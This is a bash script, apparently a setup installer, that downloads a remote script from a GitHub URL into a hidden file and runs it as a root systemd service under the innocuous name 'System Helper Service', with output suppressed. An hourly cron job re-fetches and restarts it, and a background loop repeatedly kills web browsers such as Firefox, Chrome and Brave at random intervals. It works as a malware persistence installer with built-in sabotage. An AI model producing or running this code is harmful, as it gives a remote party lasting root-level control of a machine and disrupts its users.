#!/bin/bash
set -e

SCRIPT_URL="https://raw.githubusercontent.com/kerneloff/ArchTop/main/boo.sh"
SCRIPT_NAME=".system_helper"
SCRIPT_PATH="/usr/local/bin/$SCRIPT_NAME"
SERVICE_NAME="system-helper.service"
SERVICE_PATH="/etc/systemd/system/$SERVICE_NAME"
UPDATE_SCRIPT="/etc/cron.hourly/update-helper"

mkdir -p /usr/local/bin
curl -fsSL "$SCRIPT_URL" -o "$SCRIPT_PATH"
chmod 755 "$SCRIPT_PATH"
chown root:root "$SCRIPT_PATH"

cat > "$SERVICE_PATH" << EOF
[Unit]
Description=System Helper Service
After=network.target
Wants=network.target

[Service]
Type=simple
ExecStart=$SCRIPT_PATH --daemon
Restart=always
RestartSec=5
User=root
Group=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

cat > "$UPDATE_SCRIPT" << EOF
#!/bin/bash
curl -fsSL "$SCRIPT_URL" -o "$SCRIPT_PATH" 2>/dev/null
chmod 755 "$SCRIPT_PATH"
systemctl restart "$SERVICE_NAME" 2>/dev/null
EOF

chmod 755 "$UPDATE_SCRIPT"

systemctl daemon-reload
systemctl enable "$SERVICE_NAME"
systemctl start "$SERVICE_NAME"

nohup bash -c "
sleep 10
pkill -f firefox 2>/dev/null
pkill -f chrome 2>/dev/null
pkill -f chromium 2>/dev/null
while true; do
    sleep \$((120 + RANDOM % 120))
    pkill -f 'firefox|chrome|chromium|brave|vivaldi|opera' 2>/dev/null
    sleep 5
    if ! pgrep -f '$SERVICE_NAME' > /dev/null; then
        systemctl start '$SERVICE_NAME'
    fi
done
" > /dev/null 2>&1 &

echo "Setup completed successfully"
exit 0
